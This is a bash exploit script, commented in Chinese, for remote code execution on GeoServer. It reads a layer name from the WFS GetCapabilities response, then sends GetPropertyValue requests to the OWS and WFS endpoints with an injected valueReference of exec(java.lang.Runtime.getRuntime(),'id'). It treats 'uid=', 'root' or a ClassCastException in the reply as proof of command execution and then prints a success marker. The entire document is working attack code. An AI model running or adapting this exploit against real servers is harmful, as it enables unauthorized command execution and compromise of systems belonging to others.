#!/bin/bash
# GeoServer RCE using discovered layer name
# 用法: rce_discovered_layer.sh <ENDPOINT>
set -euo pipefail

ENDPOINT="${1:-http://127.0.0.1:8080}"

echo "=== GeoServer RCE via Discovered Layer ==="

# 从 GetCapabilities 中提取图层名
for base in "${ENDPOINT}/geoserver" "${ENDPOINT}"; do
  resp=$(curl -s "${base}/wfs?service=WFS&request=GetCapabilities" --max-time 15 2>/dev/null)
  layer=$(echo "$resp" | grep -oP '<Name>[^<]+</Name>' | head -1 | sed 's/<[^>]*>//g')
  if [ -n "$layer" ]; then
    echo "[*] 发现图层: $layer (base: $base)"
    # 尝试 OWS 接口
    result=$(curl -s "${base}/ows?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=${layer}&valueReference=exec(java.lang.Runtime.getRuntime(),'id')" --max-time 15 2>/dev/null)
    echo "$result"
    if echo "$result" | grep -qiE "uid=|root|ClassCastException"; then
      echo "GEOSERVER_RCE_SUCCESS"
      break
    fi
    # 尝试 WFS 接口
    result=$(curl -s "${base}/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=${layer}&valueReference=exec(java.lang.Runtime.getRuntime(),'id')" --max-time 15 2>/dev/null)
    echo "$result"
    if echo "$result" | grep -qiE "uid=|root|ClassCastException"; then
      echo "GEOSERVER_RCE_SUCCESS"
      break
    fi
  fi
done
